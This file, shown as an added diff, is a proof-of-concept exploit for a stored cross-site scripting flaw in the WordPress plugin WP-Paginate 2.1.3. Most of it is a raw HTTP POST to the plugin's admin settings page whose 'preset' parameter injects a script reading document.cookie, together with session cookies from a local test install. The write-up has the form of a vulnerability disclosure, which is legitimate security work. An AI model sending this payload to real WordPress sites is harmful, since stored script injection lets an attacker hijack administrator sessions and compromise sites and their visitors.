@@ -1,0 +1,42 @@
+# Exploit Title: WordPress Plugin WP-Paginate 2.1.3 - 'preset' Stored XSS
+# Date: 04-01-2021
+# Software Link: https://wordpress.org/plugins/wp-paginate/
+# Exploit Author: Park Won Seok
+# Contact: kkigg39@gmail.com
+# Category: Webapps
+# Version: WP-Paginate(Ver-2.1.3)
+# CVE : N/A
+# Tested on: Windows 10 x64
+
+# description:
+# A Stored Cross-site scripting (XSS) was discovered in wordpress plugins WP-Paginate(Ver_2.1.3)
+# Vulnerability parameters : 2nd parameter "preset" have Stored-XSS.
+
+# POC -  Stored-XSS
+
+POST /wp-admin/options-general.php?page=wp-paginate.php HTTP/1.1
+Host: localhost
+Content-Length: 348
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://localhost/wp-admin/options-general.php?page=wp-paginate.php
+Accept-Encoding: gzip, deflate
+Accept-Language: ko,en-US;q=0.9,en;q=0.8
+Cookie:
+wordpress_5b1d7751a3da8a97505638936b7963ae=root%7C1609175102%7CsmSXDMcLQrRT6VE8KfGkKmVhXgpnCEAYtWIzvd91r78%7C94877ae306a5c59f9cdb81adc60a8cd6ad84e0e7551b18042ee0a33c9ab5cb31;
+wordpress_test_cookie=WP%20Cookie%20check;
+asp_transient_id=36985e31f4be2b5ae0e14586c592c87d;
+wp-settings-1=mfold%3Do%26editor%3Dhtml%26posts_list_mode%3Dlist%26unfold%3D1;
+wp-settings-time-1=1609001802;
+wordpress_logged_in_5b1d7751a3da8a97505638936b7963ae=root%7C1609175102%7CsmSXDMcLQrRT6VE8KfGkKmVhXgpnCEAYtWIzvd91r78%7Cd570540f18447db0f0859be9e8e14bab64da22c8cf50fb8a80ebea73f188cb48
+Connection: close
+
+_wpnonce=8441c7c7b9&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dwp-paginate.php&title=Pages%3A&previouspage=%26laquo%3B&nextpage=%26raquo%3B&position=none&font=font-inherit&preset=default&
+*preset='%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3e*
+&before=%3Cdiv+class%3D%22navigation%22%3E&after=%3C%2Fdiv%3E&empty=on&css=on&range=3&anchor=1&gap=3&wp_paginate_save=Save+Changes
